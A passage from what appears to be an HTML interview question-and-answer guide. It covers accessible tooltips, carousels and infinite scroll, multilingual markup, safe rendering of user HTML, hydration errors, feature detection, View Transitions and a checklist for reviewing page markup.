Use `<details>`/`<summary>` by default:

- No JavaScript needed, keyboard and screen reader support built in.
- Find-in-page opens closed `<details>` in supporting browsers.
- `name` makes it exclusive.
- You can animate it with `::details-content` and `interpolate-size` in browsers that support them.

Build a custom one (a `<button aria-expanded>` inside a heading, controlling a region) when:

- You need the trigger to be inside a heading element for structure (`<summary>` can contain a heading, but the role mix is messy in some screen readers).
- You need complex animations or state controlled by a framework.

For the custom version, `hidden="until-found"` on the panels keeps find-in-page working.

### 419: Scenario: how would you implement a tooltip?

First decide what kind:

- If it's important information, don't hide it in a tooltip. Show it as text.
- If it labels an icon button, the label belongs in `aria-label` or visually hidden text; the tooltip is only the visual version.
- If it's extra help, link it with `aria-describedby`.

A modern implementation:

```html
<button aria-describedby="tip-copy" id="copy-btn">
  <svg aria-hidden="true">...</svg>
  <span class="visually-hidden">Copy</span>
</button>
<div id="tip-copy" role="tooltip" popover="hint">Copy link to clipboard</div>
```

Show it on hover **and** focus, hide it on Esc, keep it open while the pointer is over it (WCAG 1.4.13), and position it with CSS anchor positioning or a library. Tooltips don't work on touch, so don't put anything there that touch users need.

### 420: Scenario: how do you make infinite scroll accessible?

Infinite scroll causes problems: the footer can never be reached, keyboard users have to Tab through every item, and screen readers don't know new items arrived.

Better options:

- Use a "Load more" button instead of loading automatically. It's easier for everyone and keeps the footer reachable.
- Announce new content with a polite live region: "20 more products loaded".
- Use `<article>` or list items with `aria-setsize` and `aria-posinset` if the total is known (the ARIA `feed` pattern).
- Keep focus in place after loading, and don't steal it.
- Update the URL (`?page=3`) so the Back button returns users to the same place.
- Keep a paginated version for crawlers.

### 421: Scenario: you need to set up a multilingual site. What HTML do you need?

- `lang` on `<html>` for each page (`lang="ka"`, `lang="de"`), and `lang` on parts in a different language.
- `dir="rtl"` for right-to-left languages, and use CSS logical properties (`margin-inline-start`) so the layout flips correctly.
- `hreflang` links between all versions, plus `x-default`.
- A self-referencing canonical on each version.
- Separate URLs per language (`/de/`, subdomains or domains), not one URL that changes content by cookie.
- Translated `<title>`, meta description, `alt` text and `aria-label` values. These are easy to forget.
- A language switcher made of links, with each language name written in its own language and marked with `lang`:

```html
<a href="/de/" hreflang="de" lang="de">Deutsch</a>
```

- `translate="no"` on brand names and code.

### 422: Scenario: users can write posts with formatting. How do you show their HTML safely?

1. Store the raw input, and sanitize when rendering (or both on save and render).
2. Use an allow list sanitizer, like DOMPurify on the client or a library like `sanitize-html` on the server. Allow only the tags you need (`p`, `a`, `strong`, `em`, `ul`, `li`, `code`, `pre`, `blockquote`, `img`).
3. Allow only safe attributes, and only `http`/`https`/`mailto` in `href` and `src`.
4. Add `rel="ugc nofollow noopener"` to user links.
5. Remove `id` and `name` attributes, or prefix them, to stop DOM clobbering.
6. Add a strict CSP so even if something slips through, inline scripts won't run.
7. For complete HTML documents (like emails), render them in a sandboxed iframe without `allow-same-origin`, ideally on a separate domain.

Better still, let users write Markdown and render it with raw HTML turned off.

### 423: Scenario: you need to modernize an old site built with table layouts. How do you approach it?

1. Audit what the tables are used for. Separate real data tables (keep them) from layout tables (replace them).
2. Build the new page structure with semantic elements: `<header>`, `<nav>`, `<main>`, `<aside>`, `<footer>`, headings.
3. Rebuild the layout with CSS Grid and Flexbox.
4. Move inline styling (`bgcolor`, `align`, `<font>`, `width` attributes) into CSS.
5. Do it page template by page template, not all at once. In the meantime, add `role="presentation"` to remaining layout tables so screen readers ignore their table structure.
6. Add the viewport meta tag and test on mobile, which old table layouts usually ignored.
7. Check for visual regressions with screenshot tests.

### 424: Scenario: Google Translate breaks your React app. Why, and what can you do?

Browser translation tools replace text nodes in the DOM with their own `<font>` elements containing translated text. React still holds references to the original text nodes. When React later tries to update or remove one of those nodes, it's no longer where React expects, and you get errors like "Failed to execute 'removeChild' on 'Node'".

Options:

- Wrap text that changes dynamically next to other nodes in its own element (for example `<span>{count}</span>` instead of a bare `{count}` next to other text). This reduces the problem a lot.
- Add `translate="no"` on parts that shouldn't be translated (or `<meta name="google" content="notranslate">` for the whole page, if you provide your own translations).
- Offer proper translations yourself, so users don't need the browser translator.

### 425: Scenario: you see hydration errors that only some users get. What could cause them?

When only some users have them, the cause is often outside your code:

- **Browser extensions** (password managers, Grammarly, ad blockers, dark mode tools) add attributes or elements to the DOM before hydration.
- **Browser translation** changes text.
- **Time and locale differences**: dates and numbers formatted differently on server and client (time zones, `toLocaleString`).
- **Random values or `Date.now()`** used during render.
- **Proxies or CDNs** that modify HTML (minification removing whitespace, injected scripts, email address obfuscation).
- **Feature flags or A/B tests** that give the server and the client different values.

Invalid HTML nesting is usually not the cause here, because all browsers fix it the same way, so it would show up for everyone.

Error monitoring with the browser and extension list helps. React 19 also gives more detailed hydration error messages showing the difference.

### 426: What should you think about for printing HTML pages?

- A print stylesheet: `<link rel="stylesheet" href="print.css" media="print">` or `@media print`.
- Hide navigation, ads, buttons and video in print.
- Show link URLs after links: `a[href^="http"]::after { content: " (" attr(href) ")"; }`.
- Use `break-inside: avoid` on figures, table rows and cards so they don't split across pages.
- Use `<thead>` and `<tfoot>` in tables; browsers repeat them on each printed page.
- Make sure closed `<details>`, tabs and accordions show their content in print if it matters.
- Test with the browser's print preview and the "Emulate CSS media type: print" option in DevTools.

### 427: How do you make a carousel accessible?

- Don't autoplay, or provide a visible pause button and stop on hover and focus (WCAG 2.2.2).
- Use real `<button>` elements for previous/next and for slide pickers, with clear labels.
- Mark the region: a `<section aria-roledescription="carousel" aria-label="Featured products">`, and each slide as `role="group" aria-roledescription="slide" aria-label="2 of 5"`.
- Hide off-screen slides from keyboard and screen readers with `inert` or `hidden`, so Tab doesn't go into invisible content.
- Respect `prefers-reduced-motion`.
- Announce slide changes with a polite live region only when the user changes the slide, not during autoplay.

Also question the need. Carousels usually get few clicks after the first slide, and a simple grid often works better.

### 428: Why do browsers often ignore `autocomplete="off"`?

Browsers decided that users' wishes beat site preferences for things like saved passwords and addresses. So:

- Most browsers ignore `autocomplete="off"` on login fields and still offer to save and fill passwords.
- Chrome ignores it for address and payment fields in many cases if it recognizes them.

It does still disable the browser's history of past entries for simple fields in most browsers.

If you really need a field that is never filled (like a one-time verification code for another user, or an admin field "new password for user X"), use specific values: `autocomplete="one-time-code"` or `autocomplete="new-password"`, and give the field a name that doesn't look like a common field. But don't fight autofill without a good reason; it helps users.

### 429: What is progressive enhancement in HTML?

Build the core experience with plain HTML that works without JavaScript or modern CSS, then add enhancements in layers for browsers that support them.

Examples:

- A real `<form>` that posts to the server, then enhanced with `fetch` for a smoother experience.
- Links that load full pages, then enhanced with client-side routing or speculation rules.
- `<details>` for disclosure, then enhanced with animation.
- `<select>` that works everywhere, enhanced with `appearance: base-select` where supported.
- `<img>` with `<picture>` sources for newer formats.

HTML ignores unknown elements and attributes, so new features (like `closedby`, `popover="hint"`, `sizes="auto"`) can often be added safely and simply do nothing in older browsers.

### 430: How do you detect support for HTML features in JavaScript?

Check for the property or method instead of the browser name:

```js
const supportsPopover = HTMLElement.prototype.hasOwnProperty("popover");
const supportsDialog = typeof HTMLDialogElement === "function";
const supportsLazy = "loading" in HTMLImageElement.prototype;
const supportsInert = "inert" in HTMLElement.prototype;
const supportsCommands = "command" in HTMLButtonElement.prototype;

const input = document.createElement("input");
input.type = "date";
const supportsDateInput = input.type === "date"; // unknown types fall back to "text"
```

In CSS, use `@supports` (for example `@supports (appearance: base-select)` or `@supports selector(:popover-open)`). Then load polyfills only where needed.

### 431: What is Baseline?

Baseline is a label from the web-platform-dx group (with MDN, caniuse and browser vendors) that shows if a web feature works in all major browsers: Chrome, Edge, Firefox and Safari, on desktop and mobile.

- **Newly available**: the feature works in the latest version of all those browsers.
- **Widely available**: it has been "newly available" for 30 months, so most users' browsers support it.

You'll see Baseline badges on MDN pages and caniuse. Many teams set a policy like "use Widely available features freely, use Newly available ones with a fallback". There are also linting tools that check your code against a Baseline target.

### 432: How does the browser handle unknown elements?

- An element without a hyphen that the browser doesn't know (like `<foo>`) becomes an `HTMLUnknownElement`. It renders as an inline element with no behavior.
- An element with a valid custom element name (like `<my-widget>`) becomes a plain `HTMLElement` waiting to be upgraded, and matches `:not(:defined)` until it's defined.
- Unknown attributes are kept in the DOM and can be read with `getAttribute`, but do nothing.

This forgiving behavior is what lets new HTML features be added without breaking old browsers. It's also why typos like `<buton>` don't throw errors. They just quietly don't work.

### 433: What are named properties on `window` and `form`, and why can they cause bugs?

Elements with an `id` become properties of `window`:

```html
<div id="header"></div>
<script>
  console.log(window.header); // the div
</script>
```

And form fields are available by `name` on the form:

```html
<form id="f">
  <input name="action" value="x" />
  <input name="submit" />
</form>
<script>
  const f = document.getElementById("f");
  f.action; // the <input>, not the form's action URL!
  f.submit(); // TypeError: f.submit is not a function
</script>
```

Fields named `action`, `method`, `submit`, `reset`, `elements` or `id` shadow the form's own properties. Use `form.elements.namedItem('x')`, `form.getAttribute('action')` and `HTMLFormElement.prototype.submit.call(form)` when you can't control the names. This is also the basis of DOM clobbering attacks.

### 434: What are the different ways to turn an HTML string into DOM nodes?

- `el.innerHTML = str`: replaces the children. Scripts don't run, event handler attributes do.
- `el.insertAdjacentHTML('beforeend', str)`: adds without destroying existing children.
- `<template>` + `template.innerHTML = str` + `template.content`: parses into an inert fragment. Nothing loads or runs until inserted.
- `new DOMParser().parseFromString(str, 'text/html')`: parses a full separate document. Scripts never run there.
- `document.createRange().createContextualFragment(str)`: parses in the context of a node; scripts **do** run when inserted.
- `el.setHTMLUnsafe(str)` / `Document.parseHTMLUnsafe(str)`: like innerHTML but supports declarative shadow DOM.
- `el.setHTML(str)` (Sanitizer API): parses and sanitizes, where supported.

None of the unsafe ones should get untrusted input without sanitizing.

### 435: When would you use `MutationObserver`?

`MutationObserver` watches the DOM for changes: added or removed children, attribute changes or text changes.

```js
const observer = new MutationObserver((mutations) => {
  for (const m of mutations) {
    if (m.type === "childList") {
      m.addedNodes.forEach((node) => {
        if (node instanceof HTMLImageElement && !node.alt) {
          console.warn("Image without alt added:", node);
        }
      });
    }
  }
});
observer.observe(document.body, { childList: true, subtree: true });
```

Use cases: reacting to content from third-party scripts, dev tools and accessibility checkers, syncing attributes in web components, and auto-initializing widgets when matching elements appear. It runs callbacks in batches (as microtasks), so it's efficient, but observing the whole document with `subtree` on a busy page still costs something. Call `disconnect()` when done.

### 436: What does `element.moveBefore()` solve?

Normally, moving an element in the DOM (with `insertBefore` or `append`) removes it and adds it again. That resets state: iframes reload, videos stop, CSS animations and transitions restart, focus is lost, and custom elements run `disconnectedCallback` and `connectedCallback`.

`moveBefore()` is a newer method that moves a node while keeping that state:

```js
newParent.moveBefore(videoWrapper, null); // keeps playing
```

It's useful for frameworks reordering lists, and for moving a playing video between a page and a mini player. Custom elements can implement `connectedMoveCallback()` to handle the move. It's a recent addition (Chromium first), so feature-detect it.

### 437: Why does the order of elements in the DOM matter when CSS can reorder them?

CSS properties like `order`, `flex-direction: row-reverse`, `grid-area` placement and absolute positioning change the visual order, but not the DOM order. Keyboard Tab order, screen reader reading order and copy-paste all follow the DOM.

So if you visually put the "Buy" button first but it's last in the DOM, keyboard users reach it last. That fails WCAG 1.3.2 (Meaningful Sequence) and 2.4.3 (Focus Order).

Keep the DOM order logical and use CSS reordering only for small visual changes. The CSS `reading-flow` property, newly added in Chromium, can make focus and reading follow the visual grid or flex order, but it isn't supported everywhere yet.

### 438: How does the `inert` attribute differ from `aria-hidden` plus `tabindex="-1"`?

To make an area unusable without `inert`, you had to:

- Set `aria-hidden="true"` on it.
- Find every focusable element inside and set `tabindex="-1"`.
- Remember the original `tabindex` values to restore them later.
- Block pointer events with CSS.

And content added later inside the area wouldn't be handled automatically.

`inert` does all of it in one attribute: no focus, no clicks, hidden from assistive tech, not selectable, not found by find-in-page. It's also applied automatically to everything outside a modal `<dialog>`. Use `inert` whenever you can.

### 439: What is the difference between `<a href>` and `<a>` without `href`?

An `<a>` without `href` is a "placeholder link". It's not a link at all:

- It isn't focusable.
- It has no `link` role (it's a generic element).
- It doesn't react to Enter.

```html
<a>Current page</a>
<!-- placeholder, valid -->
<a href="/about">About</a>
<!-- real link -->
```

It's valid HTML and sometimes used for the current page in navigation. But often it shows up by mistake in apps that add click handlers to `<a>` elements without `href`, which breaks keyboard access. If it acts, use a `<button>`; if it navigates, give it an `href`.

### 440: What is the `ping` attribute on links?

```html
<a href="https://example.com/product" ping="https://analytics.example.com/click"
  >Product</a
>
```

When the user follows the link, the browser sends a small `POST` request to the `ping` URL(s) in the background. It's meant for click tracking without redirect URLs or JavaScript, so navigation isn't slowed down.

Firefox has it disabled by default, and privacy tools often block it. Many sites use `navigator.sendBeacon()` instead, which gives similar non-blocking delivery from JavaScript.

### 441: What are hidden performance traps in HTML?

- Big inline SVGs repeated many times (icons in every list row). Use a sprite with `<use>`.
- Large `data:` URIs or base64 images inlined in HTML or CSS. They can't be cached separately and block parsing.
- Huge JSON state embedded in the HTML for hydration, sometimes larger than the page itself.
- Many third-party `<script>` and `<iframe>` tags (chat widgets, tag managers, embeds).
- Lots of `preload` links competing with real critical resources.
- Big DOM from wrapper divs and hidden content rendered upfront.
- Unoptimized images without `srcset`.
- Autoplay videos with `preload="auto"` below the fold.
- Fonts with many weights all loaded upfront.

The Lighthouse report and the Network panel's waterfall usually make these easy to spot.

### 442: What is `<link rel="expect">`?

It's used together with `blocking="render"` to tell the browser not to render the first frame until a certain element has been parsed:

```html
<link rel="expect" href="#hero" blocking="render" />
```

Its main use is with cross-document View Transitions. The new page waits until the element that takes part in the transition exists, so the animation has the right content. It's supported in Chromium-based browsers. Point it at an element near the top of the page, or you delay rendering.

### 443: What are cross-document View Transitions, and what HTML/CSS do they need?

They animate between two separate pages (normal navigations, not a single-page app), like a fade or a shared image moving into place.

Both pages opt in with CSS:

```css
@view-transition {
  navigation: auto;
}

.product-image {
  view-transition-name: product-photo;
}
```

The browser takes a snapshot of the old page, loads the new one, and animates between them. Elements with the same `view-transition-name` on both pages are animated from one position to the other. Same-origin navigations only. It's supported in Chromium and Safari. Other browsers just navigate normally, so it's a safe enhancement.

### 444: How do you keep up with changes to HTML?

- The WHATWG HTML spec and its GitHub repo (new features land as pull requests).
- MDN, which shows Baseline status and browser compatibility.
- web.dev and the Chrome for Developers blog, the WebKit blog, and Mozilla Hacks for release notes.
- The Interop project, which lists the features all browser vendors focus on each year.
- caniuse.com for support tables.
- Open UI (open-ui.org), where new controls like the customizable select and popovers were designed.

In interviews, it's fine to say you don't know every new feature by heart. What matters is knowing where to check and how to use new features safely with fallbacks.

### 445: Which common UI patterns can now be built with HTML only?

| Pattern                   | HTML feature                                |
| ------------------------- | ------------------------------------------- |
| Modal dialog              | `<dialog>` + `command="show-modal"`         |
| Dropdown menu, popup      | `popover` + `popovertarget`                 |
| Accordion                 | `<details name>`                            |
| Disclosure / FAQ          | `<details>` / `<summary>`                   |
| Searchable hidden content | `hidden="until-found"`                      |
| Autocomplete suggestions  | `<datalist>`                                |
| Styled select             | `<select>` + `appearance: base-select`      |
| Form validation           | `required`, `pattern`, `min`, `max`, `type` |
| Lazy loading              | `loading="lazy"`                            |
| Responsive images         | `srcset`, `sizes`, `<picture>`              |
| Instant navigation        | speculation rules                           |
| Page transitions          | View Transitions (CSS opt-in)               |

Not all of these have full browser support yet, but many of them work as progressive enhancements. Less JavaScript means less to download, fewer bugs and better accessibility by default.

### 446: What are the trade-offs of using native elements instead of custom components?

Benefits of native elements:

- Keyboard and screen reader support built in and tested across platforms.
- Work before JavaScript loads.
- Platform-specific behavior users know (for example the native date picker and select on mobile).
- Less code and fewer bugs.

Downsides:

- Limited styling for some controls (date inputs, file inputs, the `<select>` dropdown in browsers without `base-select`).
- Look and behavior differ between browsers and operating systems.
- Some features are missing (for example, a date range picker or a multi-select with chips).

A good rule: start with native elements and only build custom ones when there's a clear product need, then use a well-tested accessible library instead of starting from zero.

### 447: What does "the HTML spec is a living standard" mean for your work?

There's no "HTML 6". The WHATWG spec is updated continuously, and a feature is "done" when it's in the spec and implemented in at least two browser engines.

For daily work, that means:

- You think in terms of browser support for each feature, not HTML versions.
- New features show up regularly (recent years brought `popover`, `<search>`, `<details name>`, invoker commands, customizable select).
- Old features are rarely removed, because breaking the web is avoided. Deprecated things are often kept working for years.
- Validators follow the current spec, so markup that was valid a few years ago (like multiple headings in `<hgroup>`) might now show warnings.

### 448: Walk through what happens, from an HTML point of view, when a user types a URL and presses Enter.

1. The browser checks for a cached response or service worker, does DNS, TCP and TLS if needed, and sends the request. It might get `103 Early Hints` first.
2. The response headers arrive: `Content-Type`, CSP, caching and so on.
3. The browser decodes the bytes, using the charset from the header or `<meta charset>`.
4. The tokenizer and tree builder start creating the DOM, while the preload scanner looks ahead for resources.
5. CSS in `<head>` is fetched; rendering waits for it.
6. Sync scripts pause parsing. `defer` and module scripts download in parallel and run after parsing.
7. The parser finishes, deferred scripts run, `DOMContentLoaded` fires.
8. Style, layout and paint produce the first frames. FCP and LCP happen around here.
9. Images, iframes and async resources finish, then `load` fires.
10. Frameworks hydrate, lazy content loads as the user scrolls, and speculation rules may start preparing the next page.

### 449: What is the difference between `hidden` on an element and removing it from the DOM?

- `hidden` keeps the element in the DOM. Its state stays (form values, scroll position, video position), event listeners stay, and showing it again is instant. Its form fields are still submitted with the form.
- Removing it frees memory and DOM size, and there's nothing left to accidentally interact with or submit. But state is lost unless you store it, and re-creating it costs time.

For tabs and wizards where users go back and forth, `hidden` is usually better. For heavy content that's rarely opened (big modals, admin panels), creating it on demand is better. Frameworks often give you both options (for example conditional rendering vs a `hidden` prop).

### 450: What would you check when reviewing the HTML of a new page?

**Document**

- `<!DOCTYPE html>`, `lang`, `<meta charset>` first, viewport meta, unique `<title>`, meta description, canonical.

**Structure**

- Landmarks (`<header>`, `<nav>`, `<main>`, `<footer>`), one `<h1>`, logical heading order.
- Semantic elements instead of generic `<div>`s where they fit, valid nesting, no duplicate ids.

**Interaction**

- Buttons for actions, links for navigation, `type` on every button.
- Keyboard reachable with visible focus, logical DOM order.

**Forms**

- Labels, fieldsets, `autocomplete`, correct `type`/`inputmode`, accessible errors.

**Media**

- `alt` text, `width`/`height`, `srcset`/`sizes`, lazy loading below the fold, `fetchpriority` on the LCP image, captions for video.

**Performance and security**

- `defer`/`async` on scripts, few render-blocking resources, sensible resource hints, no inline user HTML without sanitizing, `title` and `sandbox`/`allow` on iframes.

Then run the validator, axe and Lighthouse to catch what you missed.
